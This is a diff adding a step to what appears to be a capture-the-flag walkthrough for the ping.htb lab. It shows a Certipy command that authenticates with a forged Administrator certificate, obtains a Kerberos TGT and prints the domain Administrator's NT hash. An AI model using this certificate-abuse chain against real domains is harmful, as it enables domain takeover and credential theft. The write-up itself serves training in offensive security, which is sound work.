@@ -1263,7 +1263,26 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'administrator.pfx'
 ```
 
-Ill export the TGT for the user that now has enrollee rights 
+Ill export the TGT for the user that now has enrollee rights, then request the cert for the DA
+
+```python
+❯❯❯ faketime -f +8h certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.2.1                     
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator@ping.htb'
+[*]     SAN URL SID: 'S-1-5-21-750635624-2058721901-1932338391-500'
+[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-500'
+[*] Using principal: 'administrator@ping.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@ping.htb': aad3b435b51404eeaad3b435b51404ee:63905deb12b527aadfdbc26d3f423eff
+```
+
+Ill then auth and get a TGT and the NL
 
 
 
